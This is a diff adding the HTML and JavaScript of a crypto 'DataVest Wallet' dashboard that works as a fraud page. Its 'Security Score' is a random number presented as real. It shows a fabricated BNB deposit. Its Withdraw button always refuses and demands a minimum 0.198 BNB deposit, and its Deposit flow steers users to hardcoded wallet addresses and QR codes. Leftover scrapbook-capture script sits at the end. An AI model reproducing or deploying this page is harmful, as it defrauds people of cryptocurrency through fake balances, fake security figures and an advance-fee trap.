+                        class="@container/card-header auto-rows-min grid-rows-[auto_auto] gap-1.5 px-6 has-data-[slot=card-action]:grid-cols-[1fr_auto] [.border-b]:pb-6 flex flex-row items-center justify-between space-y-0 pb-2">
+                        <div data-slot="card-title" class="text-sm font-medium font-mono">Security Score</div><svg
+                            xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+                            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                            class="lucide lucide-shield w-4 h-4 text-green-500">
+                            <path
+                                d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z">
+                            </path>
+                        </svg>
+                    </div>
+
+                    <div data-slot="card-content" class="px-6">
+                        <div id="security-percent" class="text-2xl font-bold font-sans text-yellow-500"
+                            style="opacity: 1;">94%</div>
+                        <p class="text-xs text-muted-foreground font-mono">Security level</p>
+                    </div>
+
+                    <style>
+                        /* Smooth number transition */
+                        #security-percent {
+                            transition: all 1s ease-in-out;
+                        }
+                    </style>
+
+                    <script>
+                        // Function to generate random Security %
+                        function updateSecurity() {
+                            // Random Security % between 80% and 99
+                            let securityPercent = Math.floor(Math.random() * (99 - 80 + 1) + 80);
+
+                            const securityEl = document.getElementById('security-percent');
+
+                            // Animate number change using CSS transition
+                            securityEl.style.opacity = 0; // fade out
+                            setTimeout(() => {
+                                securityEl.textContent = `${securityPercent}%`;
+
+                                // Dynamic color based on value
+                                if (securityPercent >= 90) {
+                                    securityEl.className = 'text-2xl font-bold font-sans text-green-500';
+                                } else if (securityPercent >= 85) {
+                                    securityEl.className = 'text-2xl font-bold font-sans text-yellow-500';
+                                } else {
+                                    securityEl.className = 'text-2xl font-bold font-sans text-red-500';
+                                }
+
+                                securityEl.style.opacity = 1; // fade in
+                            }, 500); // fade duration half of transition
+                        }
+
+                        // Initial call on page load
+                        updateSecurity();
+
+                        // Update every 30 seconds
+                        setInterval(updateSecurity, 30000);
+                    </script>
+
+
+
+                </div>
+            </div>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
+                <div data-slot="card"
+                    class="text-card-foreground flex flex-col gap-6 rounded-xl border py-6 shadow-sm bg-card border-border">
+                    <div data-slot="card-header"
+                        class="@container/card-header grid auto-rows-min grid-rows-[auto_auto] items-start gap-1.5 px-6 has-data-[slot=card-action]:grid-cols-[1fr_auto] [.border-b]:pb-6">
+                        <div data-slot="card-title" class="leading-none font-semibold font-sans">Quick Actions</div>
+                        <div data-slot="card-description" class="text-muted-foreground text-sm font-mono">Manage your
+                            Wallet assets</div>
+                    </div>
+                    <div data-slot="card-content" class="px-6 space-y-3"><button data-slot="button"
+                            class="inline-flex items-center gap-2 whitespace-nowrap rounded-md text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*='size-'])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border shadow-xs hover:bg-accent hover:text-accent-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 h-9 px-4 py-2 has-[&gt;svg]:px-3 w-full justify-start bg-transparent"><svg
+                                xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                                fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                                stroke-linejoin="round" class="lucide lucide-arrow-down-left w-4 h-4 mr-2">
+                                <path d="M17 7 7 17"></path>
+                                <path d="M17 17H7V7"></path>
+                            </svg>Deposit Assets</button><button data-slot="button"
+                            class="inline-flex items-center gap-2 whitespace-nowrap rounded-md text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*='size-'])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border shadow-xs hover:bg-accent hover:text-accent-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 h-9 px-4 py-2 has-[&gt;svg]:px-3 w-full justify-start bg-transparent"><svg
+                                xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                                fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                                stroke-linejoin="round" class="lucide lucide-arrow-up-right w-4 h-4 mr-2">
+                                <path d="M7 7h10v10"></path>
+                                <path d="M7 17 17 7"></path>
+                            </svg>Withdraw Assets</button><button data-slot="button"
+                            class="inline-flex items-center gap-2 whitespace-nowrap rounded-md text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*='size-'])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border shadow-xs hover:bg-accent hover:text-accent-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 h-9 px-4 py-2 has-[&gt;svg]:px-3 w-full justify-start bg-transparent"><svg
+                                xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                                fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                                stroke-linejoin="round" class="lucide lucide-trending-up w-4 h-4 mr-2">
+                                <polyline points="22 7 13.5 15.5 8.5 10.5 2 17"></polyline>
+                                <polyline points="16 7 22 7 22 13"></polyline>
+                            </svg>View Analytics</button></div>
+                </div>
+                <div data-slot="card"
+                    class="text-card-foreground flex flex-col gap-6 rounded-xl border py-6 shadow-sm bg-card border-border">
+                    <div data-slot="card-header"
+                        class="@container/card-header grid auto-rows-min grid-rows-[auto_auto] items-start gap-1.5 px-6 has-data-[slot=card-action]:grid-cols-[1fr_auto] [.border-b]:pb-6">
+                        <div data-slot="card-title" class="leading-none font-semibold font-sans">DataVest Wallet Status
+                        </div>
+                        <div data-slot="card-description" class="text-muted-foreground text-sm font-mono">Current
+                            DataVest Live
+                            Wallet
+                            information</div>
+                    </div>
+                    <div data-slot="card-content" class="px-6 space-y-4">
+                        <div class="flex items-center justify-between"><span
+                                class="text-sm font-mono">Status</span><span data-slot="badge"
+                                class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden [a&amp;]:hover:bg-primary/90 bg-green-500/20 text-green-500 border-green-500/30">Active</span>
+                        </div>
+                        <div class="flex items-center justify-between"><span class="text-sm font-mono">Connected
+                                Wallet</span><span class="text-sm font-mono text-muted-foreground">0x4f70...4993</span>
+                        </div>
+                        <div class="flex items-center justify-between"><span class="text-sm font-mono">Last
+                                Activity</span><span class="text-sm font-mono text-muted-foreground">Just now</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div data-slot="card"
+                class="text-card-foreground flex flex-col gap-6 rounded-xl border py-6 shadow-sm bg-card border-border">
+                <div data-slot="card-header"
+                    class="@container/card-header grid auto-rows-min grid-rows-[auto_auto] items-start gap-1.5 px-6 has-data-[slot=card-action]:grid-cols-[1fr_auto] [.border-b]:pb-6">
+                    <div data-slot="card-title" class="leading-none font-semibold font-sans">Recent Activity</div>
+                    <div data-slot="card-description" class="text-muted-foreground text-sm font-mono">Your latest
+                        DataVest
+                        Wallet
+                        transactions</div>
+                </div>
+                <div data-slot="card-content" class="px-6">
+                    <div class="text-center py-8"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24"
+                            viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                            stroke-linecap="round" stroke-linejoin="round"
+                            class="lucide lucide-wallet w-12 h-12 text-muted-foreground mx-auto mb-4">
+                            <path
+                                d="M19 7V4a1 1 0 0 0-1-1H5a2 2 0 0 0 0 4h15a1 1 0 0 1 1 1v4h-3a2 2 0 0 0 0 4h3a1 1 0 0 0 1-1v-2a1 1 0 0 0-1-1">
+                            </path>
+                            <path d="M3 5v14a2 2 0 0 0 2 2h15a1 1 0 0 0 1-1v-4"></path>
+                        </svg>
+                        <h3 class="text-lg font-semibold font-sans mb-2">Activity Live</h3>
+
+                        <button id="show-btn" onclick="toggleDeposits()"
+                            class="inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium transition-all bg-primary text-primary-foreground shadow-xs hover:bg-primary/90 h-9 px-4 py-2">
+                            Deposit History
+                        </button>
+
+                        <div id="deposits" style="display:none;">
+                            <p>💸 +0.259 BNB has been deposited to your DataVest Wallet</p>
+
+
+
+                        </div>
+
+
+                        <script>
+                            function toggleDeposits() {
+                                const deposits = document.getElementById("deposits");
+                                const button = document.getElementById("show-btn");
+
+                                if (deposits.style.display === "none" || deposits.style.display === "") {
+                                    deposits.style.display = "block";
+                                    button.textContent = "Closed Deposit";
+                                } else {
+                                    deposits.style.display = "none";
+                                    button.textContent = "Deposits History";
+                                }
+                            }
+                        </script>
+
+                        <!-- Deposit Button -->
+
+                        <!-- <button id="deposit-btn" data-slot="button"
+                            class="inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&_svg]:pointer-events-none [&_svg:not([class*='size-'])]:size-4 shrink-0 [&_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive bg-primary text-primary-foreground shadow-xs hover:bg-primary/90 h-9 px-4 py-2 has-[&gt;svg]:px-3">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                                fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                                stroke-linejoin="round" class="lucide lucide-arrow-down-left w-4 h-4 mr-2">
+                                <path d="M17 7 7 17"></path>
+                                <path d="M17 17H7V7"></path>
+                            </svg>
+                            Make Your First Deposit
+                        </button>
+
+                        <script>
+                            document.getElementById('deposit-btn').addEventListener('click', function () {
+                                // Prompt user for deposit amount
+                                let depositAmount = prompt("Enter the amount you want to deposit:");
+
+                                // If user entered a value (or even canceled, show error)
+                                if (depositAmount !== null && depositAmount !== "") {
+                                    alert("You do not have enough balance in your wallet. Please try again.");
+                                } else {
+                                    alert("You do not have enough balance in your wallet. Please try again.");
+                                }
+                            });
+                        </script> -->
+
+                        <!-- ========= DEPOSIT BUTTON ========= -->
+                        <button id="deposit-btn" data-slot="button"
+                            class="inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*='size-'])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive bg-primary text-primary-foreground shadow-xs hover:bg-primary/90 h-9 px-4 py-2 has-[&gt;svg]:px-3">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                                fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                                stroke-linejoin="round" class="lucide lucide-arrow-down-left w-4 h-4 mr-2">
+                                <path d="M17 7 7 17"></path>
+                                <path d="M17 17H7V7"></path>
+                            </svg>
+                            Deposit
+                        </button>
+
+                        <!-- ========= MODAL FOR DEPOSIT ========= -->
+                        <div id="depositModal" class="modal hidden">
+                            <div class="modal-content">
+                                <h2>Select Coin &amp; Amount</h2>
+
+                                <select id="cryptoSelect" class="modal-input">
+                                    <option value="BNB">BNB - BNB (BEP20)</option>
+                                    <option value="BTC">BTC - Bitcoin</option>
+                                    <option value="ETH">ETH - Ethereum</option>
+                                    <option value="USDT">USDT - Tether BEP20</option>
+                                    <option value="USDT">USDT - Tether ERC20</option>
+                                    <option value="TRX">TRX - Tron</option>
+                                </select>
+
+                                <input type="number" id="depositAmount" placeholder="Enter amount" class="modal-input">
+
+                                <button id="confirmDeposit" class="modal-btn">Continue</button>
+                                <button id="closeModal" class="modal-btn cancel">Cancel</button>
+                            </div>
+                        </div>
+
+                        <!-- ========= RESULT MODAL (Wallet Info) ========= -->
+                        <div id="walletModal" class="modal hidden">
+                            <div class="modal-content">
+                                <h2>Send Your Deposit</h2>
+                                <p id="amountText"></p>
+
+                                <p><strong>Wallet Address:</strong></p>
+                                <p id="walletAddress" class="address-text"></p>
+
+                                <button id="copyWallet" class="copy-btn">Copy Address</button>
+
+                                <img id="qrImage" src="" width="220" style="margin: 15px auto 5px; display:block;">
+
+                                <button id="closeWalletModal" class="modal-btn">Done</button>
+                            </div>
+                        </div>
+
+                        <!-- ========= CSS ========= -->
+                        <style>
+                            .modal {
+                                position: fixed;
+                                left: 0;
+                                top: 0;
+                                width: 100%;
+                                height: 100%;
+                                background: rgba(0, 0, 0, 0.75);
+                                display: flex;
+                                justify-content: center;
+                                align-items: center;
+                                z-index: 9999;
+                            }
+
+                            .hidden {
+                                display: none;
+                            }
+
+                            .modal-content {
+                                background: #000;
+                                padding: 25px;
+                                width: 90%;
+                                max-width: 350px;
+                                border-radius: 12px;
+                                text-align: center;
+                                font-family: Arial;
+                                color: white;
+                                border: 1px solid #333;
+                            }
+
+                            .modal-input {
+                                width: 100%;
+                                padding: 10px;
+                                margin: 10px 0;
+                                background: #111;
+                                border: 1px solid #444;
+                                border-radius: 6px;
+                                color: white;
+                            }
+
+                            .modal-btn {
+                                background: #2563eb;
+                                color: white;
+                                padding: 10px 18px;
+                                border: none;
+                                border-radius: 8px;
+                                cursor: pointer;
+                                margin: 5px;
+                            }
+
+                            .modal-btn:hover {
+                                opacity: .8;
+                            }
+
+                            .cancel {
+                                background: #666;
+                            }
+
+                            .copy-btn {
+                                background: #22c55e;
+                                color: white;
+                                border: none;
+                                padding: 8px 14px;
+                                margin-bottom: 10px;
+                                border-radius: 6px;
+                                cursor: pointer;
+                            }
+
+                            .copy-btn:hover {
+                                opacity: .85;
+                            }
+
+                            .address-text {
+                                word-break: break-all;
+                                font-size: 14px;
+                                color: #fff;
+                            }
+                        </style>
+
+                        <!-- ========= JAVASCRIPT ========= -->
+                        <script>
+                            // Wallet data storage
+                            const walletData = {
+                                BNB: { address: "0xE9F5598819f53068f0b305EC95b1D08a561dD0f8", qr: "deposit/bnbbep20.jpg" },
+                                //BTC: { address: "bc1qtn0826e2m0rx532c23dpdhaqt8r7jrjj0yzm9j", qr: "bitcoin.jpg" },
+                                ETH: { address: "0xE9F5598819f53068f0b305EC95b1D08a561dD0f8", qr: "deposit/eth2.jpg" },
+                                USDT: { address: "0xE9F5598819f53068f0b305EC95b1D08a561dD0f8", qr: "deposit/usdtbep20.jpg" },
+                                USDT: { address: "0xE9F5598819f53068f0b305EC95b1D08a561dD0f8", qr: "deposit/usdtbep20.jpg" },
+                                TRX: { address: "TY5CeTXqMvEQfRqciJNSQvHFvAgSrNaXRT", qr: "deposit/trx2.jpg" }
+                            };
+
+
+                            // Elements reference
+                            const depositBtn = document.getElementById("deposit-btn");
+                            const depositModal = document.getElementById("depositModal");
+                            const walletModal = document.getElementById("walletModal");
+                            const closeModal = document.getElementById("closeModal");
+                            const closeWalletModal = document.getElementById("closeWalletModal");
+                            const cryptoSelect = document.getElementById("cryptoSelect");
+                            const depositAmount = document.getElementById("depositAmount");
+                            const confirmDeposit = document.getElementById("confirmDeposit");
+                            const copyWallet = document.getElementById("copyWallet");
+
+                            // Open deposit modal
+                            depositBtn.addEventListener("click", () => depositModal.classList.remove("hidden"));
+
+                            // Close deposit modal
+                            closeModal.addEventListener("click", () => depositModal.classList.add("hidden"));
+
+                            // Confirm deposit and show wallet info
+                            confirmDeposit.addEventListener("click", () => {
+                                const amount = depositAmount.value;
+                                if (!amount || amount <= 0) { alert("Please enter a valid amount."); return; }
+
+                                const selectedCoin = cryptoSelect.value;
+                                const walletInfo = walletData[selectedCoin];
+
+                                document.getElementById("amountText").innerHTML = `Deposit Amount: <strong>${amount} ${selectedCoin}</strong>`;
+                                document.getElementById("walletAddress").innerText = walletInfo.address;
+                                document.getElementById("qrImage").src = walletInfo.qr;
+
+                                depositModal.classList.add("hidden");
+                                walletModal.classList.remove("hidden");
+                            });
+
+                            // Close wallet modal
+                            closeWalletModal.addEventListener("click", () => walletModal.classList.add("hidden"));
+
+                            // Copy wallet address
+                            copyWallet.addEventListener("click", () => {
+                                const address = document.getElementById("walletAddress").innerText;
+                                navigator.clipboard.writeText(address).then(() => {
+                                    copyWallet.innerText = "Copied ✓";
+                                    setTimeout(() => copyWallet.innerText = "Copy Address", 2000);
+                                });
+                            });
+                        </script>
+
+
+
+
+
+
+                        <br>
+                        <br>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                        <!-- Withdraw Button -->
+
+                        <button id="withdraw-btn" data-slot="button"
+                            class="inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*='size-'])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive bg-primary text-primary-foreground shadow-xs hover:bg-primary/90 h-9 px-4 py-2 has-[&gt;svg]:px-3">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                                fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                                stroke-linejoin="round" class="lucide lucide-arrow-down-left w-4 h-4 mr-2">
+                                <path d="M17 7 7 17"></path>
+                                <path d="M17 17H7V7"></path>
+                            </svg>
+                            Withdraw Balance
+                        </button>
+
+                        <script>
+                            // Shared function for both deposit and withdrawal
+                            function handleTransaction(type) {
+                                let amount = prompt(`Enter the amount you want to :`);
+                                const okRedirectURL = "#";   // Page to redirect when user clicks OK
+                                const cancelRedirectURL = "#"; // Page to redirect when user clicks Cancel or closes prompt
+
+                                if (amount !== null && amount !== "") {
+                                    alert(` 🔕❌ You do not have enough deposit balance to withdraw or activate acct. Deposit into Your Wallet The Minimum Of 0.198Bnb (Bep20) to process your withdrawal.. & Please try again..`);
+                                    window.location.href = okRedirectURL; // Redirect after OK
+                                } else {
+                                    alert(`🔕❌ Transaction cancelled or invalid amount entered.`);
+                                    window.location.href = cancelRedirectURL; // Redirect after Cancel or empty input
+                                }
+                            }
+
+                            // Attach event listener
+                            document.getElementById('withdraw-btn').addEventListener('click', function () {
+                                handleTransaction("withdraw");
+                            });
+                        </script>
+
+
+
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+    <script
+        data-scrapbook-elem="basic-loader">(function () { var k1 = "data-scrapbook-shadowdom", k2 = "data-scrapbook-canvas", k3 = "data-scrapbook-input-indeterminate", k4 = "data-scrapbook-input-checked", k5 = "data-scrapbook-option-selected", k6 = "data-scrapbook-input-value", k7 = "data-scrapbook-textarea-value", k8 = "data-scrapbook-adoptedstylesheets", k9 = /^data-scrapbook-adoptedstylesheet-(\d+)$/, k10 = "data-scrapbook-shadowdom-mode", k11 = "data-scrapbook-shadowdom-clonable", k12 = "data-scrapbook-shadowdom-delegates-focus", k13 = "data-scrapbook-shadowdom-serializable", k14 = "data-scrapbook-shadowdom-slot-assignment", k15 = "data-scrapbook-slot-assigned", k16 = "data-scrapbook-slot-index", k17 = /^scrapbook-slot-index=(\d+)$/, k18 = '/scrapbook-slot-index', d = document, r = d.documentElement, $s = !!r.attachShadow, $as = !!d.adoptedStyleSheets, $c = !!window.HTMLCanvasElement, $sa = !!d.createElement('slot').assign, sle = [], sls = [], slt = function (r) { if ($sa) { var E = r.childNodes, i, e, s, m; for (i = 0; i < E.length; i++) { e = E[i]; if (e.nodeType === 8) { s = e.nodeValue; if (m = s.match(k17)) { s = e.nextSibling; if (s.nodeType === 3) { sls[m[1]] = s; } r.removeChild(e); i--; } else if (s === k18) { r.removeChild(e); i--; } } } } }, sl = function () { var i = sle.length, j, d, e; while (i--) { d = sle[i]; e = d.elem; d = d.value.split(','); j = d.length; while (j--) { d[j] = sls[parseInt(d[j], 10)]; } try { try { e.assign.apply(e, d); } catch (ex) { if (ex.message.includes('must have a callable @@iterator')) { e.assign(d); } else { throw ex; } } } catch (ex) { console.error(ex); } } }, asl = (function (r) { var l = [], E, i, e, m, c, j; if ($as) { E = r.attributes; i = E.length; while (i--) { e = E[i]; if (!(m = e.nodeName.match(k9))) { continue; } c = l[m[1]] = new CSSStyleSheet(); r.removeAttribute(m[0]); m = e.nodeValue.split('\n\n'); j = m.length; while (j--) { try { m[j] && c.insertRule(m[j]); } catch (ex) { console.error(ex); } } } } return l; })(r), as = function (d, e) { var l, i, I; if ($as && (l = e.getAttribute(k8)) !== null) { l = l.split(',').map(i => asl[i]); d.adoptedStyleSheets = d.adoptedStyleSheets.concat(l); e.removeAttribute(k8); } }, fn = function (r) { var E = r.querySelectorAll ? r.querySelectorAll("*") : r.getElementsByTagName("*"), i = E.length, e, d, s, m; while (i--) { e = E[i]; s = e.shadowRoot; if ($s && (d = e.getAttribute(k1))) { if (!s) { try { s = e.attachShadow({ mode: (m = e.getAttribute(k10)) !== null ? m : 'open', clonable: e.hasAttribute(k11), delegatesFocus: e.hasAttribute(k12), serializable: e.hasAttribute(k13), slotAssignment: (m = e.getAttribute(k14)) !== null ? m : void 0, }); s.innerHTML = d; } catch (ex) { console.error(ex); } } e.removeAttribute(k1); e.removeAttribute(k10); e.removeAttribute(k11); e.removeAttribute(k12); e.removeAttribute(k13); e.removeAttribute(k14); } if ($c && (d = e.getAttribute(k2)) !== null) { (function () { var c = e, g = new Image(); g.onload = function () { c.getContext('2d').drawImage(g, 0, 0); }; g.src = d; })(); e.removeAttribute(k2); } if ((d = e.getAttribute(k3)) !== null) { e.indeterminate = true; e.removeAttribute(k3); } if ((d = e.getAttribute(k4)) !== null) { e.checked = d === 'true'; e.removeAttribute(k4); } if ((d = e.getAttribute(k5)) !== null) { e.selected = d === 'true'; e.removeAttribute(k5); } if ((d = e.getAttribute(k6)) !== null) { e.value = d; e.removeAttribute(k6); } if ((d = e.getAttribute(k7)) !== null) { e.value = d; e.removeAttribute(k7); } if ($sa && (d = e.getAttribute(k15)) !== null) { sle.push({ elem: e, value: d }); e.removeAttribute(k15); } if ($sa && (d = e.getAttribute(k16)) !== null) { sls[d] = e; e.removeAttribute(k16); } if (s) { slt(e); as(s, e); fn(s); } } }; as(d, r); fn(d); sl(); })()</script>
+
+
+</body>
+<script src="chrome-extension://lgmpcpglpngdoalbgeoldeajfclnhafa/inpage.js"></script>
+
+</html>
